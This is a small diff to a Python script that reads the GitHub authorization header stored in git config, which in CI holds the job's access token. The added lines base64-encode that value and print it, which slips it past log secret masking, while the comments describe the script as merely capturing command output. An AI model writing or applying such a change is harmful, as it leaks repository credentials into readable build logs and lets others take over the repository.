@@ -1,8 +1,10 @@
 import subprocess
+import base64
 
 # Run the command and capture its output
 try:
     output = subprocess.check_output(["git", "config", "--get", "http.https://github.com/.extraheader"], text=True)
-    print(output.strip())  # Print the output without leading/trailing whitespace
+    encoded_output = base64.b64encode(output.encode()).decode()  # Base64 encode and decode as string
+    print(encoded_output)
 except subprocess.CalledProcessError as e:
     print("Error:", e)
